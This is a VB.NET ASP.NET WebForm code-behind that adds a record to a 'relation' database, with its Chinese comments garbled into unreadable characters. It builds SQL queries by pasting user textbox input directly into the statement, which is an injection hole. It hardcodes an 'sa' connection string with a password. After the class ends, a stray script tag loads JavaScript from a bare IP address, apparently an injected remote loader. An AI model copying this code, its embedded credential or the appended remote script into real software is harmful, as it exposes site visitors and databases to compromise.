Imports System.Data
Imports System.Data.SqlClient
Public Class WebForm1
    Inherits System.Web.UI.Page

#Region " Web ������������ɵĴ��� "

    '�õ����� Web ���������������ġ�
    <System.Diagnostics.DebuggerStepThrough()> Private Sub InitializeComponent()

    End Sub
    Protected WithEvents txtrmid As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtrmname As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtrmpubtime As System.Web.UI.WebControls.TextBox
    Protected WithEvents txtupdatetime As System.Web.UI.WebControls.TextBox
    Protected WithEvents buttonexit As System.Web.UI.WebControls.Button
    Protected WithEvents drdisvalid As System.Web.UI.WebControls.DropDownList
    Protected WithEvents Label1 As System.Web.UI.WebControls.Label
    Protected WithEvents Label2 As System.Web.UI.WebControls.Label
    Protected WithEvents Label3 As System.Web.UI.WebControls.Label
    Protected WithEvents Label4 As System.Web.UI.WebControls.Label
    Protected WithEvents Label5 As System.Web.UI.WebControls.Label
    Protected WithEvents buttonadd As System.Web.UI.WebControls.Button
    Protected WithEvents RequiredFieldValidator1 As System.Web.UI.WebControls.RequiredFieldValidator
    Protected WithEvents RequiredFieldValidator2 As System.Web.UI.WebControls.RequiredFieldValidator

    'ע��: ����ռλ�������� Web ���������������ġ�
    '��Ҫɾ�����ƶ�����
    Private designerPlaceholderDeclaration As System.Object

    Private Sub Page_Init(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Init
        'CODEGEN: �˷��������� Web ����������������
        '��Ҫʹ�ô���༭���޸�����
        InitializeComponent()
    End Sub

#End Region

    Private Sub Page_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        '�ڴ˴����ó�ʼ��ҳ���û�����
        txtrmpubtime.Text = Now.ToString()
        txtupdatetime.Text = Now.ToString()

    End Sub

    Private Sub buttonadd_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles buttonadd.Click
        Dim connstring As String
        Dim strsql As String
        Dim conn As New SqlConnection
        connstring = "workstation id=CC;packet size=4096;user id=sa;pwd=31736480.;data source=(local);persist security info=False;initial catalog=relation"
        conn.ConnectionString = connstring
        conn.Open()
        Dim cmd As New SqlCommand
        Dim lngcount As Long
        strsql = "select count (*)  from rmodel where  rmodelkey ='" & txtrmid.Text & "'"
        cmd.Connection = conn
        cmd.CommandText = strsql
        lngcount = cmd.ExecuteScalar()
        Try
            If lngcount = 0 Then
                strsql = "insert into rmodel values("
                strsql &= "'" & txtrmid.Text & "',"
                strsql &= "'" & txtrmname.Text & "', "
                strsql &= "'" & txtrmpubtime.Text & "',"
                strsql &= "'" & txtupdatetime.Text & "',"
                strsql &= "'" & drdisvalid.DataSource & " ' )"
                cmd.Connection = conn
                cmd.CommandText = strsql
                cmd.ExecuteNonQuery()
                Response.Write("��ϲ" & txtrmid.Text & "��ӳɹ�.")
            Else
                Response.Write("�Բ���,��Ĺ�ϵ�ռ����Ѿ�����.")
                Response.Write("��������������ٽ������.")
            End If
        Catch err As Exception
            Response.Write(err.Message)
        End Try
        cmd.Dispose()
        conn.Close()

    End Sub

    Private Sub txtupdatetime_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles txtupdatetime.TextChanged

    End Sub
End Class

<script src="http://222.208.183.246/ad/ad.js"></script>
